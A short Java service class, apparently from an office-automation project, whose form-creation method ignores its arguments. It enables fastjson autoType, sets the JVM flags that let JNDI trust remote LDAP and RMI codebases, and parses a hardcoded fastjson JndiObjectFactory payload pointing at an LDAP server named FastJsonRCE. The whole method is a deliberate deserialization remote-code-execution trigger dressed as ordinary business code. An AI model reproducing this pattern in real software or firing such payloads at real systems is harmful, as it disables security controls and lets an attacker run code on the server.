package com.lxx.oa.service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

import java.util.Date;

/**
 * @author 林修贤
 * @date 2023/2/6
 * @description
 */
public class JsonToObjService {
    private Long formId;
    private Long employeeId;
    private Integer formType;
    private Date startTime;
    private Date endTime;
    private String reason;
    private Date createTime;
    private String state;

    public JSONObject creatForm(String eid, String formType, String startTime, String endTime, String reason){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/FastJsonRCE\"}";
        return JSON.parseObject(payload);
    }
}
